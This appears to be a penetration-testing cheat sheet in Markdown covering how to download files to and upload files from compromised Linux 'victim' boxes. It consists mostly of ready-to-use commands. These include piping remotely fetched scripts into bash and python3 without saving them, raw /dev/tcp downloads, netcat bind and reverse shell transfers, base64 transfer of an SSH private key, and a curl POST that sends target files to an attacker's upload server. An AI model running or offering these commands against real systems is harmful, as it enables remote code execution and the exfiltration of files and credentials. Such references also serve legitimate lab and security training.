# Downloading to Linux

## Base64 Encoding / Decoding

### Check SSH Key MD5 hash
```bash
md5sum id_rsa
	4e301756a07ded0a2dd6953abf015278 id_rsa
```

### Encode SSH Key to Base64
```bash
cat id_rsa | base64 -w 0; echo
	[Base64_Output]
```

### Decode the File and Save to Target Linux Box
```bash
echo -n '[Base64_Output]' | base64 -d > id_rsa
```

### Confirm MD5 Hashes Match
```bash
md5sum id_rsa
	4e301756a07ded0a2dd6953abf015278 id_rsa
```


## Wget and cURL

### Download a File Using wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
	- NOTE output filename option is capital '-O'

### Download a File Using cURL
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
```
	- NOTE output filename option is lowercase '-o'


## Fileless Attacks

### Fileless Download with cURL
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless Download with wget
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


## Download with Bash (/dev/tcp)

### Connect to the Target Webserver
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

### HTTP GET Request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response
```bash
cat <&3
```


## SSH Downloads

### Enable the SSH Server
```bash
sudo systemctl enable ssh
```

### Start the SSH Server
```bash
sudo systemctl start ssh
```

### Check/ Verify for SSH Listening Port
```bash
netstat -lnpt
	...
	Proto   Recv-Q  Send-Q  Local Address    Foreign Address    State     PID/Program name
	tcp          0       0  0.0.0.0:22       0.0.0.0:*          LISTEN    -
```

### Downloading Files Using SCP

>Recommend creating a temp user account for file transfers to avoid using primary creds or keys on remote comp.

```bash
# scp remote_login:file local_save
scp [Attack_User]@[Attack_IP]:[Target_File_Path] [Output_File]
```


# Uploading

## Netcat

### Netcat Sending File via Bind Shell
```bash
nc -q 0 [Victim_IP] [Port] < [Input_File]
```

### Ncat Sending File via Bind Shell
```bash
nc -q 0 [Victim_IP] [Port] < [Input_File]
```

### Netcat Sending File via Reverse Shell
```bash
sudo nc -l -p [Port] -q 0 < [Input_File]
```

### Ncat Sending File via Reverse Shell
```bash
sudo ncat -l -p [Port] --send-only < [Input_File]
```


## Web Upload

### Start Web Server on Attack box
```bash
sudo python3 -m pip install --user uploadserver
```

### Create a Self-Signed Certificate on Attack box
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

>Webserver should not host the cert.  Recommend creating a new dir to host the file for the webserver

### Start Web Server on Attack box
```bash
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### Upload Multiple Files from Victim
```bash
curl -X POST https://[Attack_IP]/[Output_File] -F 'files=@[Target_File_Path]' -F 'files=@[Target_File_Path]' --insecure
```
	- --insecure option - Because we used a self-signed cert that we trust


## Alternative Web File Transfer Method
- If the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page.
- Remember that inbound traffic may be blocked.

### Creating a Web Server w/ Python3 on Victim Box
```bash
python3 -m http.server
```

### Creating a Web Server w/ Python2.7 on Victim Box
```bash
python2.7 -m SimpleHTTPServer
```

### Creating a Web Server w/ PHP on Victim Box
```bash
php -S 0.0.0.0:8000
```

### Creating a Web Server w/ Ruby on Victim Box
```bash
ruby -run -ehttpd . -p8000
```

### Download the File from the Victim Box onto the Attack Box
```bash
wget [Victim_File_URL]
```


## SCP Upload

### File Upload using SCP
```bash
# scp local_file remote_login:save_path
scp [Target_File_Path] [Attack_User]@[AttackIP]:[Output_File_Path]
```